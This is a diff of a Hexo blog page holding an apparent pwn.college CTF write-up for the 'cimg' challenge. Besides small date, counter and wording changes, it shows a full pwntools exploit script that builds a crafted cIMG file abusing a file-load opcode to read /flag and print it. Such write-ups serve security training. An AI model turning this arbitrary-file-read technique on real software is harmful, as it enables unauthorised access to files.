@@ -30,7 +30,7 @@
 <meta property="og:description" content="Often times, as feature bloat makes a software project more and more complicated, vulnerabilities slip in due to the interaction of too many moving parts. In the course of reverse engineering the sof">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-03-18T07:27:25.000Z">
-<meta property="article:modified_time" content="2026-09-08T14:40:47.284Z">
+<meta property="article:modified_time" content="2026-09-15T02:00:33.750Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="pwncollege">
@@ -232,18 +232,18 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -316,7 +316,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 10:00:33" itemprop="dateModified" datetime="2026-09-15T10:00:33+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -387,9 +387,9 @@ handle_5</p>
 <p>标准读取时，如果读到了换行符 (<code>\n</code>，十六进制
 <code>0x0A</code>)，程序会抛出 <code>ERROR: Invalid character</code>
 并退出。而 <code>/flag</code> 文件的末尾有一个换行符</p>
-<p>既然我们知道 <code>read_exact</code> 只有在读到指定长度
-(<code>Width * Height</code>) 时才会返回，我们只需要让
-<code>Width</code> 等于 Flag 字符串的长度（不包含换行符）。</p>
+<p><code>read_exact</code> 仅在读到指定长度
+(<code>Width * Height</code>) 时才返回，因此只需让 <code>Width</code>
+等于 Flag 字符串的长度（不包含换行符）。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    binary_path = <span class="string">&quot;/challenge/cimg&quot;</span></span><br><span class="line"></span><br><span class="line">    flag_len = <span class="number">59</span> <span class="comment"># known flag length</span></span><br><span class="line">    payload = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. Header: Version 4, 画布大小 100x1, 2 个指令</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;4sHBBI&quot;</span>, <span class="string">b&quot;cIMG&quot;</span>, <span class="number">4</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Directive 1 -&gt; handle_5: 任意文件加载</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">5</span>)  <span class="comment"># Opcode 5</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;BBB&quot;</span>, <span class="number">1</span>, flag_len, <span class="number">1</span>)  <span class="comment"># ID=1, Width=flag_len, Height=1</span></span><br><span class="line">    path = <span class="string">b&quot;/flag&quot;</span>.ljust(<span class="number">255</span>, <span class="string">b&quot;\x00&quot;</span>)  <span class="comment"># 恶意路径，Null截断</span></span><br><span class="line">    payload += path</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Directive 2 -&gt; handle_4: 渲染到屏幕</span></span><br><span class="line">    <span class="comment"># 参数: Opcode(4), ID(1), R(255), G(255), B(255), X(0), Y(0), RepeatX(1), RepeatY(1), Trans(0)</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;HBBBBBBBBB&quot;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    file_name = <span class="string">&quot;exploit_payload.cimg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行二进制</span></span><br><span class="line">        p = process([binary_path, file_name])</span><br><span class="line">        out = p.recvall(timeout=<span class="number">1</span>).decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> out:</span><br><span class="line">            <span class="comment"># 用正则剥离 ANSI 颜色</span></span><br><span class="line">            clean_text = re.sub(<span class="string">r&quot;\x1b\[.*?m&quot;</span>, <span class="string">&quot;&quot;</span>, out)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;pwn.college&quot;</span> <span class="keyword">in</span> clean_text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Success Flag length: <span class="subst">&#123;flag_len&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Raw Flag: <span class="subst">&#123;clean_text.strip()&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
 
     </div>
